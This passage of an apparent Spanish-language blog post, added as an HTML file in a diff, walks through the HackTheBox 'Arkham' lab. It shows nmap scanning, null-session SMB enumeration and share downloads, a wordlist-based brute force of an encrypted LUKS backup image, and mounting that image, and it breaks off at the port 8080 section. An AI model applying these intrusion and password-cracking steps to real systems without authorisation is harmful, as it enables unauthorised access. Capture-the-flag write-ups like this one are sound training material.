@@ -1,0 +1,1945 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+<link rel="icon" href="/assets/images/lanz2.png">
+
+<title>HackTheBox - Arkham</title>
+
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>HackTheBox - Arkham | Sh0x blog</title>
+<meta name="generator" content="Jekyll v3.8.6" />
+<meta property="og:title" content="HackTheBox - Arkham" />
+<meta name="author" content="lanz" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Máquina Windows nivel medio, deserializaremos JavaServer Faces, jugaremos con muchos payloads con la necesidad de firmarlos con una llave :O Haremos Port Fortwarding, leeremos correos y montaremos el directorio raiz del sistema (C:) en otro con todos los permisos para leer archivos." />
+<meta property="og:description" content="Máquina Windows nivel medio, deserializaremos JavaServer Faces, jugaremos con muchos payloads con la necesidad de firmarlos con una llave :O Haremos Port Fortwarding, leeremos correos y montaremos el directorio raiz del sistema (C:) en otro con todos los permisos para leer archivos." />
+<link rel="canonical" href="http://localhost:4000/htb/arkham" />
+<meta property="og:url" content="http://localhost:4000/htb/arkham" />
+<meta property="og:site_name" content="Sh0x blog" />
+<meta property="og:image" content="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/arkham/179banner.png" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2021-04-28T00:00:00-07:00" />
+<meta name="twitter:card" content="summary_large_image" />
+<meta property="twitter:image" content="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/arkham/179banner.png" />
+<meta property="twitter:title" content="HackTheBox - Arkham" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"lanz"},"dateModified":"2021-04-28T00:00:00-07:00","datePublished":"2021-04-28T00:00:00-07:00","description":"Máquina Windows nivel medio, deserializaremos JavaServer Faces, jugaremos con muchos payloads con la necesidad de firmarlos con una llave :O Haremos Port Fortwarding, leeremos correos y montaremos el directorio raiz del sistema (C:) en otro con todos los permisos para leer archivos.","headline":"HackTheBox - Arkham","image":"https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/arkham/179banner.png","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/htb/arkham"},"publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"http://localhost:4000/assets/images/sh0x.png"},"name":"lanz"},"url":"http://localhost:4000/htb/arkham"}</script>
+<!-- End Jekyll SEO tag -->
+
+    
+<link href="/assets/css/prism.css" rel="stylesheet">
+
+<link href="/assets/css/theme.css" rel="stylesheet">
+
+<script src="/assets/js/jquery.min.js"></script>
+
+</head>
+
+
+
+
+<body>
+	<!-- defer loading of font and font awesome -->
+	<noscript id="deferred-styles">
+		<link href="https://fonts.googleapis.com/css?family=Sen:400,700&display=swap" rel="stylesheet">
+        <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.0.13/css/all.css" integrity="sha384-DNOHZ68U8hZfKXOrtjWvjxusGo9WQnrNx2sqG0tfsghAvtVlRW3tvkXWZh58N9jp" crossorigin="anonymous">
+	</noscript>
+
+
+<!-- Begin Sidebar Navigation
+================================================== -->
+
+<div class="sidebar">    
+</div>   
+<div class="nav-icon">
+    <div class="hamburger-bar"></div>
+</div>
+<div id="blackover-nav" class="blackover"></div>
+<nav id="menu">
+    <ul>
+        <h3>El tiempo a destiempo</h3>
+        <li><a href="/" style="color: #0ecbe4;">Home</a></li>
+        <li><a href="/categories#article">Artículos</a></li>
+        <li><a href="/categories#htb">HackTheBox</a></li>
+        <li><a href="/about" style="color: rgb(89, 89, 89);">Whoami</a></li>
+    </ul>   
+</nav>
+
+<script src="/assets/js/lunr.js"></script>
+
+<style>
+    
+</style>
+
+<div class="wrap-search">
+    <div class="d-flex align-items-center ml-auto">
+        <i class="fas fa-search show-search"></i>
+        <form class="bd-search ml-3" onSubmit="return lunr_search(document.getElementById('lunrsearch').value);">
+            <input type="text" class="form-control bigradius text-small launch-modal-search" id="lunrsearch" name="q" maxlength="255" value="" placeholder="Escribe y enter :P"/>
+        </form>
+    </div>
+</div>
+
+<div id="lunrsearchresults">
+    <ul></ul>
+</div>
+
+<script src="/assets/js/lunrsearchengine.js"></script>
+
+
+<!-- End Sidebar Navigation
+================================================== -->
+
+<div class="site-content ">
+
+<div class="container">
+
+    <!-- Site Logo/Name
+    ================================================== -->
+   
+    <a class="navbar-brand" href="/">
+        <img src="/assets/images/sh0x.png" alt="Sh0x blog">
+    </a>  
+   
+
+    <!-- Site Tag
+    ================================================== -->
+    
+
+    <!-- Content
+    ================================================== -->
+    <div class="main-content">
+        <div class="entry-header">
+    <!-- Post Title -->
+    <h1 class="posttitle">HackTheBox - Arkham</h1>
+    <!-- Author & Date  Box -->
+    
+    
+    <div class="d-flex align-items-center mt-4">
+        <div>
+            
+            <img class="author-thumb" src="https://www.gravatar.com/avatar/e56154546cf4be74e393c62d1ae9f9d4?s=250&d=mm&r=x" alt="Sh0x">
+            
+        </div>            
+        <div>
+        Funk <a targ="_blank" class="text-info">Sh0x</a> el 
+        <span class="post-date"><time class="post-date" datetime="2021-04-28">28 Apr 2021</time></span>           
+        
+        </div>            
+    </div>
+    
+</div>
+
+<!-- Adsense under title if enabled from _config.yml (change your pub id and slot) -->
+
+
+<!-- Featured Image -->
+
+<div class="entry-featured-image">
+    
+    <img class="featured-image " src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/arkham/179banner.png" alt="HackTheBox - Arkham">
+    
+</div>
+
+
+<!-- Content -->
+<!-- Post, Page Content
+================================================== -->
+<div class="article-post">
+    <!-- Toc if any -->
+    
+    <!-- End Toc -->
+    <p>Máquina Windows nivel medio, deserializaremos <strong>JavaServer Faces</strong>, jugaremos con muchos payloads con la necesidad de firmarlos con una llave :O Haremos <strong>Port Fortwarding</strong>, leeremos correos y montaremos el directorio <strong>raiz</strong> del sistema (<strong>C:</strong>) en otro con todos los permisos para leer archivos.</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/arkham/179arkhamHTB.png" alt="179arkhamHTB" /></p>
+
+<h3 id="tldr-spanish-writeup">TL;DR (Spanish writeup)</h3>
+
+<p><strong>Creada por</strong>: <a href="https://www.hackthebox.eu/profile/8308">MinatoTW</a>.</p>
+
+<p>Buaaa, a jugar. Nos enfrentaremos a una deserialización insegura mediante el servicio <strong>JavaServer Faces</strong> y su campo <strong>javax.faces.ViewState</strong>, pero necesitaremos una llave para lograr encriptar nuestro payload, la llave la encontraremos enumerando el servicio <strong>SMB</strong> en un archivo <strong>LUKS</strong> encriptado, haremos fuerza bruta para encontrar la contraseña del objeto y finalmente obtener la llave para firmar el payload. Nos apoyaremos de <strong>ysoserial</strong> para generar varios payloads maliciosos y ejecutar comandos en el sistema, obtendremos una terminal como el usuario <strong>Alfred</strong>.</p>
+
+<p>Estando dentro nos toparemos con un archivo <strong>.zip</strong> el cual contiene el backup del correo de <strong>alfred</strong>, dentro una imagen que nos muestra nuevas credenciales, en este caso del usuario <strong>Batman</strong>. Aprovecharemos que el servicio <strong>WinRM</strong> está siendo ejecutado internamente para entablarnos un <strong>Reverse Port Fortwarding</strong> y finalmente usar <strong>evil-winrm</strong>. Así obtendremos una <strong>PowerShell</strong> como <strong>batman</strong>.</p>
+
+<p>Nos daremos cuenta de que estamos en el grupo <strong>Administrators</strong>, pero que no tenemos los permisos realmente. Podemos aprovechar la herramienta <strong>net use</strong> para montarnos el directorio <strong>C:\</strong> en un disco cualquiera, así tendremos todos los archivos del sistema para jugar con ellos.</p>
+
+<p>(Entiendo que debe haber otra forma en la que tengamos tooooooodos los permisos, pero aún sigo mirándolo).</p>
+
+<h4 id="clasificación-de-la-máquina">Clasificación de la máquina</h4>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/arkham/179statistics.png" style="display: block; margin-left: auto; margin-right: auto; width: 90%;" /></p>
+
+<p>Poco jugueteo, queriendo ser real pero jmm :(</p>
+
+<blockquote>
+  <p>Escribo para tener mis “notas”, por si algun dia se me olvida todo, leer esto y reencontrarme (o talvez no) :) además de enfocarme en plasmar mis errores y exitos (por si ves mucho texto), todo desde una perspectiva más de enseñanza que de solo plasmar lo que hice.</p>
+</blockquote>
+
+<p>…</p>
+
+<p>BUEEENO COMO ESSSS:</p>
+
+<ol>
+  <li><a href="#enumeracion">Enumeración</a>.</li>
+  <li><a href="#explotacion">Explotación</a>.</li>
+  <li><a href="#movimiento-lateral-alfred-batman">Movimiento lateral <strong>Alfred</strong> -&gt; <strong>Batman</strong></a>.</li>
+  <li><a href="#escalada-de-privilegios">Escalada de privilegios</a>.</li>
+</ol>
+
+<p>…</p>
+
+<h2 id="enumeracion">Enumeración <a href="#enumeracion">#</a></h2>
+
+<p>Como siempre, validemos que servicios esta corriendo la máquina:</p>
+
+<pre><code class="language-bash">❭ nmap -p- --open -v 10.10.10.130 -oG initScan
+</code></pre>
+
+<table>
+  <thead>
+    <tr>
+      <th>Parámetro</th>
+      <th style="text-align: left">Descripción</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>-p-</td>
+      <td style="text-align: left">Escanea todos los 65535</td>
+    </tr>
+    <tr>
+      <td>–open</td>
+      <td style="text-align: left">Solo los puertos que están abiertos</td>
+    </tr>
+    <tr>
+      <td>-v</td>
+      <td style="text-align: left">Permite ver en consola lo que va encontrando</td>
+    </tr>
+    <tr>
+      <td>-oG</td>
+      <td style="text-align: left">Guarda el output en un archivo con formato grepeable para usar una <a href="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/magic/extractPorts.png">función</a> de <a href="https://s4vitar.github.io/">S4vitar</a> que me extrae los puertos en la clipboard</td>
+    </tr>
+  </tbody>
+</table>
+
+<pre><code class="language-bash">❭ cat initScan 
+# Nmap 7.80 scan initiated Fri Apr 23 25:25:25 2021 as: nmap -p- --open -v -oG initScan 10.10.10.130
+# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
+Host: 10.10.10.130 ()   Status: Up
+Host: 10.10.10.130 ()   Ports: 80/open/tcp//http///, 135/open/tcp//msrpc///, 139/open/tcp//netbios-ssn///, 445/open/tcp//microsoft-ds///, 8080/open/tcp//http-proxy///, 49666/open/tcp/////, 49667/open/tcp/////    Ignored State: filtered (65528)
+# Nmap done at Fri Apr 23 25:25:25 2021 -- 1 IP address (1 host up) scanned in 404.77 seconds
+</code></pre>
+
+<p>Nos encontramos los puertos:</p>
+
+<table>
+  <thead>
+    <tr>
+      <th>Puerto</th>
+      <th style="text-align: left">Descripción</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>80</td>
+      <td style="text-align: left"><strong><a href="https://searchnetworking.techtarget.com/definition/port-80">HTTP</a></strong></td>
+    </tr>
+    <tr>
+      <td>135</td>
+      <td style="text-align: left"><strong><a href="https://automai.force.com/help/s/article/how-to-configure-rpc-dynamic-port-allocation-to-work-with-firewalls">RPC</a></strong></td>
+    </tr>
+    <tr>
+      <td>139</td>
+      <td style="text-align: left"><strong><a href="https://www.varonis.com/blog/smb-port/">SMB</a></strong></td>
+    </tr>
+    <tr>
+      <td>445</td>
+      <td style="text-align: left"><strong><a href="https://www.varonis.com/blog/smb-port/">SMB</a></strong></td>
+    </tr>
+    <tr>
+      <td>8080</td>
+      <td style="text-align: left"><strong><a href="https://www.watchguard.com/help/docs/help-center/es-419/Content/es-419/fireware/proxies/http/http_proxy_about_c.html">HTTP Proxy</a></strong></td>
+    </tr>
+    <tr>
+      <td>49666 - 49667</td>
+      <td style="text-align: left">Desconocidos</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Listo, ya tenemos los puertos abiertos, pero ahora juguemos a escanear scripts y versiones, asi obtendremos más info de cada uno:</p>
+
+<p><strong>(Usamos la función referenciada antes</strong></p>
+
+<pre><code class="language-bash">❭ extractPorts initScan 
+───────┬─────────────────────────────────────────────────────────────
+   1   │ 
+   2   │ [*] Extracting information...
+   3   │ 
+   4   │     [*] IP Address: 10.10.10.130
+   5   │     [*] Open ports: 80,135,139,445,8080,49666,49667
+   6   │ 
+   7   │ [*] Ports copied to clipboard
+   8   │ 
+───────┴─────────────────────────────────────────────────────────────
+</code></pre>
+
+<p><strong>)</strong></p>
+
+<pre><code class="language-bash">❭ nmap -p80,135,139,445,8080,49666,49667 -sC -sV 10.10.10.130 -oN portScan
+</code></pre>
+
+<table>
+  <thead>
+    <tr>
+      <th>Parámetro</th>
+      <th style="text-align: left">Descripción</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>-p</td>
+      <td style="text-align: left">Escaneo de los puertos obtenidos</td>
+    </tr>
+    <tr>
+      <td>-sC</td>
+      <td style="text-align: left">Muestra todos los scripts relacionados con el servicio</td>
+    </tr>
+    <tr>
+      <td>-sV</td>
+      <td style="text-align: left">Nos permite ver la versión del servicio</td>
+    </tr>
+    <tr>
+      <td>-oN</td>
+      <td style="text-align: left">Guarda el output en un archivo</td>
+    </tr>
+  </tbody>
+</table>
+
+<pre><code class="language-bash">❭ cat portScan 
+# Nmap 7.80 scan initiated Fri Apr 23 25:25:25 2021 as: nmap -p80,135,139,445,8080,49666,49667 -sC -sV -oN portScan 10.10.10.130
+Nmap scan report for 10.10.10.130
+Host is up (0.20s latency).
+
+PORT      STATE SERVICE       VERSION
+80/tcp    open  http          Microsoft IIS httpd 10.0
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: IIS Windows Server
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds?
+8080/tcp  open  http          Apache Tomcat 8.5.37
+| http-methods: 
+|_  Potentially risky methods: PUT DELETE
+|_http-open-proxy: Proxy might be redirecting requests
+|_http-title: Mask Inc.
+49666/tcp open  msrpc         Microsoft Windows RPC
+49667/tcp open  msrpc         Microsoft Windows RPC
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: 7m16s
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2021-04-23T17:34:01
+|_  start_date: N/A
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Fri Apr 23 25:25:25 2021 -- 1 IP address (1 host up) scanned in 100.17 seconds
+</code></pre>
+
+<p>Obtenemos (varias cositas que veremos despues) por ahora:</p>
+
+<table>
+  <thead>
+    <tr>
+      <th style="text-align: left">Puerto</th>
+      <th style="text-align: left">Servicio</th>
+      <th style="text-align: left">Versión</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td style="text-align: left">80</td>
+      <td style="text-align: left">HTTP</td>
+      <td style="text-align: left">Microsoft IIS httpd 10</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">135</td>
+      <td style="text-align: left">RPC</td>
+      <td style="text-align: left">Microsoft Windows RPC</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">139</td>
+      <td style="text-align: left">SMB</td>
+      <td style="text-align: left">Microsoft Windows netbios-ssn</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">445</td>
+      <td style="text-align: left">SMB</td>
+      <td style="text-align: left">(?) No sabemos</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">8080</td>
+      <td style="text-align: left">HTTP Proxy</td>
+      <td style="text-align: left">Apache Tomcat 8.5.37</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">49666</td>
+      <td style="text-align: left">RPC</td>
+      <td style="text-align: left">Microsoft Windows RPC</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">49667</td>
+      <td style="text-align: left">RPC</td>
+      <td style="text-align: left">Microsoft Windows RPC</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Bien, empecemos a divagar, perdámonos en cada puerto y veamos en cuál podremos renacer 😂</p>
+
+<p>…</p>
+
+<h3 id="puerto-80">Puerto 80 <a href="#puerto-80">⌖</a></h3>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/arkham/179page80.png" alt="179page80" /></p>
+
+<p>La ventana por default del servidor <strong>Windows</strong> I<strong>nternet</strong> I<strong>nformation</strong> S<strong>ervices</strong> (IIS), no hay nada en el código fuente y tampoco validando mediante fuzzing si había algo fuera de la vista… Así que por ahora movámonos a otro puerto.</p>
+
+<p>…</p>
+
+<h3 id="puerto-135">Puerto 135 (RPC) <a href="#puerto-135">⌖</a></h3>
+
+<blockquote>
+  <p><strong>MSRPC</strong> (Microsoft Remote Procedure Call): Nos permite ejecutar procesos remotamente, pueden ser en otros sistemas o recursos compartidos en la red.</p>
+</blockquote>
+
+<p>Podemos usar <code>rpcclient</code> para interactuar con el dominio, ya que nos permite acceder con credenciales nulas:</p>
+
+<pre><code class="language-bash">❭ rpcclient -U '' 10.10.10.130
+Enter WORKGROUP\'s password: 
+rpcclient $&gt; enumdomusers 
+result was NT_STATUS_CONNECTION_DISCONNECTED
+</code></pre>
+
+<p>o</p>
+
+<pre><code class="language-bash">❭ rpcclient -U '' 10.10.10.130 -N
+rpcclient $&gt; enumdomusers 
+Could not initialise samr. Error was NT_STATUS_ACCESS_DENIED
+</code></pre>
+
+<p>Pero dando unas vueltas obtenemos siempre errores, así que por ahora tampoco podemos sacar mucho de acá, veamos los puertos SMB.</p>
+
+<p>…</p>
+
+<h3 id="puerto-139-445">Puerto 139-445 (SMB) <a href="#puerto-139-445">⌖</a></h3>
+
+<blockquote>
+  <p><strong>SAMBA</strong>, en terminos generales nos permite compartir archivos (y varias cosas más) entre usuarios de una misma red.</p>
+</blockquote>
+
+<ul>
+  <li><a href="https://www.varonis.com/blog/smb-port/">Más info sobre los puertos <strong>139</strong> y <strong>445</strong> de SAMBA</a>.</li>
+</ul>
+
+<p>Inicialmente podemos validar con <code>crackmapexec</code> la versión del sistema con el que estamos jugando:</p>
+
+<pre><code class="language-bash">❭ crackmapexec smb 10.10.10.130
+SMB         10.10.10.130    445    ARKHAM           [*] Windows 10.0 Build 17763 x64 (name:ARKHAM) (domain:ARKHAM) (signing:False) (SMBv1:False)
+</code></pre>
+
+<p>Sistema operativo <code>Windows 10 Build 17763</code> :o</p>
+
+<p>Ahora usemos <code>smbmap</code> para ver los recursos compartidos (en caso de existir y si nos deja verlos, claro esta):</p>
+
+<pre><code class="language-bash">❭ smbmap -H 10.10.10.130
+[+] IP: 10.10.10.130:445        Name: unknown 
+</code></pre>
+
+<p>Indiquemosle un <strong>null session</strong>:</p>
+
+<pre><code class="language-bash">❭ smbmap -H 10.10.10.130 -u 'null'
+[+] Guest session       IP: 10.10.10.130:445    Name: unknown
+        Disk                            Permissions     Comment
+        ----                            -----------     -------
+        ADMIN$                          NO ACCESS       Remote Admin
+        BatShare                        READ ONLY       Master Wayne's secrets
+        C$                              NO ACCESS       Default share
+        IPC$                            READ ONLY       Remote IPC
+        Users                           READ ONLY
+</code></pre>
+
+<p>Perfe, podemos listar recursos compartidos y vemos dos objetos interesantes, <strong>BatShare</strong> (Master Wayne’s secrets) y <strong>Users</strong></p>
+
+<h3 id="descargando-archivos---batshare">Descargando archivos - BatShare</h3>
+
+<p>Usemos <code>smbclient</code> para ver detalladamente que contienen:</p>
+
+<pre><code class="language-bash">❭ smbclient //10.10.10.130/BatShare -U ''
+Enter WORKGROUP\'s password: 
+Try "help" to get a list of possible commands.
+smb: \&gt; dir
+  .                                   D        0  Sun Feb  3 08:00:10 2019
+  ..                                  D        0  Sun Feb  3 08:00:10 2019
+  appserver.zip                       A  4046695  Fri Feb  1 01:13:37 2019
+
+                5158399 blocks of size 4096. 2128829 blocks available
+smb: \&gt;
+</code></pre>
+
+<p>Podemos descargarlo de vaaaaarias formas, veamos dos, primero desde el propio <code>smbclient</code> (por si quisiéramos descargar muuuchos archivos):</p>
+
+<ul>
+  <li><a href="https://superuser.com/questions/856617/how-do-i-recursively-download-a-directory-using-smbclient/856640">Download recursively a directory using <strong>smbclient</strong></a>.</li>
+</ul>
+
+<pre><code class="language-bash">smb: \&gt; mask ""
+smb: \&gt; recurse ON
+smb: \&gt; prompt OFF
+smb: \&gt; mget *
+getting file \appserver.zip of size 4046695 as appserver.zip (436,2 KiloBytes/sec) (average 436,2 KiloBytes/sec)
+smb: \&gt;
+</code></pre>
+
+<pre><code class="language-bash">❭ ls
+appserver.zip
+❭ file appserver.zip 
+appserver.zip: Zip archive data, at least v2.0 to extract
+</code></pre>
+
+<p>Ahora con la herramienta <code>smbget</code> (Ponen un espacio en la contraseña):</p>
+
+<pre><code class="language-bash">❭ smbget -R smb://10.10.10.130/BatShare -U ''
+Password for [] connecting to //BatShare/10.10.10.130: 
+Using workgroup WORKGROUP, guest user
+smb://10.10.10.130/BatShare/appserver.zip                                                                                                                                                       
+Downloaded 3,86MB in 24 seconds
+</code></pre>
+
+<pre><code class="language-bash">❭ file appserver.zip 
+appserver.zip: Zip archive data, at least v2.0 to extract
+</code></pre>
+
+<p>Antes de seguir con el archivo <code>.zip</code>, validemos el otro recurso compartido.</p>
+
+<h3 id="descargando-archivos---users">Descargando archivos - Users</h3>
+
+<p>De nuevo con <code>smbclient</code>:</p>
+
+<pre><code class="language-bash">❭ smbclient //10.10.10.130/Users -U ''
+Enter WORKGROUP\'s password: 
+Try "help" to get a list of possible commands.
+smb: \&gt; dir
+  .                                  DR        0  Sun Feb  3 08:24:10 2019
+  ..                                 DR        0  Sun Feb  3 08:24:10 2019
+  Default                           DHR        0  Thu Jan 31 21:49:06 2019
+  desktop.ini                       AHS      174  Sat Sep 15 02:16:48 2018
+  Guest                               D        0  Sun Feb  3 08:24:19 2019
+
+                5158399 blocks of size 4096. 2126185 blocks available
+smb: \&gt;
+</code></pre>
+
+<p>Listo, toda la pinta del directorio <code>C:\Users\</code>, volvamos a repetir cualquiera de las dos formas para descargarnos los archivos:</p>
+
+<pre><code class="language-bash">❭ smbget -R smb://10.10.10.130/Users -U ''
+Password for [] connecting to //Users/10.10.10.130: 
+Using workgroup WORKGROUP, guest user
+smb://10.10.10.130/Users/Default/AppData/Local/Microsoft/Windows/Shell/DefaultLayouts.xml
+...
+...
+...
+smb://10.10.10.130/Users/Guest/Videos/desktop.ini
+Downloaded 34,76MB in 685 seconds
+</code></pre>
+
+<p>Uff, un montón de archivos (son varios, pero pues no voy a poner toda la lista) 😱</p>
+
+<p>Bueno, ahora si descomprimamos el archivo <code>.zip</code>.</p>
+
+<h3 id="jugando-con-archivos---batshare">Jugando con archivos - BatShare</h3>
+
+<p>Con <code>unzip</code> sale sencillito:</p>
+
+<pre><code class="language-bash">❭ unzip appserver.zip 
+Archive:  appserver.zip
+  inflating: IMPORTANT.txt
+  inflating: backup.img
+</code></pre>
+
+<p><strong>IMPORTANT.txt</strong>:</p>
+
+<pre><code class="language-bash">❭ cat IMPORTANT.txt 
+Alfred, this is the backup image from our linux server. Please see that The Joker or anyone else doesn't have unauthenticated access to it. - Bruce 
+</code></pre>
+
+<p>Jmm <strong>Alfred</strong>, se puso lindo esto :D</p>
+
+<p>Tenemos dos usuarios (o tres) para guardar por si algo:</p>
+
+<ul>
+  <li><strong>Alfred</strong>.</li>
+  <li><strong>Bruce</strong>.</li>
+  <li><strong>The Joker</strong> (No creo, pero pues no se sabe).</li>
+</ul>
+
+<p>Veamos la dichosa imagen que contiene el servidor Linux:</p>
+
+<pre><code class="language-bash">❭ file backup.img 
+backup.img: LUKS encrypted file, ver 1 [aes, xts-plain64, sha256] UUID: d931ebb1-5edc-4453-8ab1-3d23bb85b38e
+</code></pre>
+
+<p>Un archivo <strong>LUKS</strong> encriptado…</p>
+
+<blockquote>
+  <p><strong>LUKS</strong> (Linux Unified Key Setup-on-disk-format) es una implementación muy sencilla de utilizar para la gestión de particiones y unidades de almacenamiento cifradas en GNU/Linux. Se recomienda su uso en dispositivos móviles, computadoras portátiles y dispositivos de almacenamiento cuya información se desee proteger en caso de extravío o robo. <a href="https://www.alcancelibre.org/staticpages/index.php/ciframiento-particiones-luks">Cifrado de particiones con LUKS</a>.</p>
+</blockquote>
+
+<p>Leyendo sobre como manejar esta imagen y de alguna forma ver su contenido, encontramos <a href="https://askubuntu.com/questions/835525/how-to-mount-luks-encrypted-file">este recurso</a>:</p>
+
+<pre><code class="language-bash">❭ cryptsetup open --type luks /htb/arkham/content/backup.img desire
+Introduzca la frase contraseña de /htb/arkham/content/backup.img: 
+No hay ninguna clave disponible con esa frase contraseña.
+</code></pre>
+
+<p>Nos pide una contraseña… Buscando sobre como podríamos crackear (o jugar con) el archivo encontramos varios recursos:</p>
+
+<ul>
+  <li><a href="https://dfir.science/2014/08/how-to-brute-forcing-password-cracking.html">Brute forcing password cracking devices (LUKS)</a>.</li>
+  <li><a href="https://security.stackexchange.com/questions/128539/how-to-crack-encrypted-disk-crypto-luks-in-an-efficient-way">How to crack encrypted disk (crypto-LUKS) in an efficient way?</a>.
+    <ul>
+      <li><a href="https://www.incredigeek.com/home/projects/grond/">Grond: The LUKS Password Cracker</a>.</li>
+      <li><a href="https://github.com/glv2/bruteforce-luks"><strong>JUGAMOS PRINCIPALMENTE CON:</strong> https://github.com/glv2/bruteforce-luks</a>.</li>
+    </ul>
+  </li>
+</ul>
+
+<p>Pero si intentamos alguna forma de crackeo demora eternidades 😟 Podríamos pensar que quizás en el otro recurso compartido pueda estar alguna contraseña de algún usuario o algo parecido, pero la verdad es que no, (a menos que me haya fallado la vista y el tipeo) no encontramos nada :(</p>
+
+<p>Acá estuve un tiempito recorriendo archivos y jugando con pensamiento lateral hasta que encontramos (creo) una relación entre el nombre de la carpeta compartida (<strong>BatShare</strong>) y una parte de la nota IMPORTANTE que tenía la imagen (<strong>The Joker</strong>). Si relacionamos los dos nombres podemos juntar a <strong>Batman</strong> y el <strong>Joker</strong>, probablemente sea algún tipo de “pista”. Así que creémonos una wordlist que contenga todas las palabras relacionadas a esas dos (esta parte me costó pensarla):</p>
+
+<pre><code class="language-bash">❭ grep -iE "joker|batman" /usr/share/wordlists/rockyou.txt | wc -l
+2961
+❭ grep -iE "joker|batman" /usr/share/wordlists/rockyou.txt &gt; batJok.txt
+</code></pre>
+
+<p>Ahora volvamos a intentar el bruteforce:</p>
+
+<pre><code class="language-bash">❭ bruteforce-luks -f batJok.txt -v 30 backup.img
+</code></pre>
+
+<p>Le pasamos el diccionario y la imagen para que vaya probando, ademas de indicarle que nos musetre cada 30 segundos en que posicion va:</p>
+
+<pre><code class="language-bash">❭ bruteforce-luks -f batJok.txt -v 30 backup.img
+Warning: using dictionary mode, ignoring options -b, -e, -l, -m and -s.
+...
+Tried passwords: 109
+Tried passwords per second: 0,403704
+Last tried password: batman02
+
+Tried passwords: 121
+Tried passwords per second: 0,403333
+Last tried password: batman1234
+
+Tried passwords: 129
+Tried passwords per second: 0,403125
+Last tried password: batmanforever
+
+Password found: batmanforever
+</code></pre>
+
+<p>:o Encontramso una posible password, pues intentemos ahora abrir el archivo:</p>
+
+<ul>
+  <li><a href="https://askubuntu.com/questions/835525/how-to-mount-luks-encrypted-file">Mount LUKS encrypted file</a>.</li>
+</ul>
+
+<pre><code class="language-bash">❭ cryptsetup open --type luks $(pwd)/backup.img desire
+Introduzca la frase contraseña de /htb/arkham/content/SMB/BatShare/backup.img:
+</code></pre>
+
+<p>No obtenemos ningun error, validemos:</p>
+
+<pre><code class="language-bash">❭ ls -la /dev/mapper/
+total 0
+drwxr-xr-x  2 root root      80 abr 25 14:28 .
+drwxr-xr-x 18 root root    3400 abr 25 14:28 ..
+crw-------  1 root root 10, 236 abr 25 14:28 control
+lrwxrwxrwx  1 root root       7 abr 25 14:28 desire -&gt; ../dm-0
+</code></pre>
+
+<p>Y ahora lo montamos:</p>
+
+<pre><code class="language-bash">❭ ls -la /mnt
+total 16
+drwxr-xr-x 1 root root   0 abr 28  2020 .
+drwxr-xr-x 1 root root 300 ene 26 10:52 .
+❭ mount /dev/mapper/desire /mnt
+· ※ /home/jntx/sec/htb/arkham/content/SMB/BatShare ·
+❭ ls -la /mnt
+total 30
+drwxr-xr-x 4 root root  1024 dic 25  2018 .
+drwxr-xr-x 1 root root   300 ene 26 10:52 ..
+drwx------ 2 root root 12288 dic 25  2018 lost+found
+drwxrwxr-x 4 root root  1024 dic 25  2018 Mask
+</code></pre>
+
+<p>Ahora veamos que hay en los directorios:</p>
+
+<pre><code class="language-bash">❭ tree
+.
+├── lost+found
+└── Mask
+    ├── docs
+    │   └── Batman-Begins.pdf
+    ├── joker.png
+    ├── me.jpg
+    ├── mycar.jpg
+    ├── robin.jpeg
+    └── tomcat-stuff
+        ├── context.xml
+        ├── faces-config.xml
+        ├── jaspic-providers.xml
+        ├── MANIFEST.MF
+        ├── server.xml
+        ├── tomcat-users.xml
+        ├── web.xml
+        └── web.xml.bak
+
+4 directories, 13 files
+</code></pre>
+
+<p>Lo interesante lo tenemos en el directorio <code>Mask/tomcat-stuff/</code>, de primeras podríamos ir directamente al archivo <code>tomcat-users.xml</code> que a veces contienen credenciales de usuarios tomcat, pero esta vez no hay nada útil…</p>
+
+<p>Para trabajar un poco más rápido, copiamos la carpeta <code>Mask/</code> al equipo y la desmontamos del sistema:</p>
+
+<pre><code class="language-bash">❭ umount /mnt
+</code></pre>
+
+<p>Visitando los archivos de *tomcat**, vemos otro llamativo a la vista, <code>web.xml.bak</code>, pero no podemos hacer nada con él ni con los otros, así que 😐</p>
+
+<p>…</p>
+
+<h3 id="puerto-8080">Puerto 8080 (Proxy) <a href="#puerto-8080">⌖</a></h3>
+
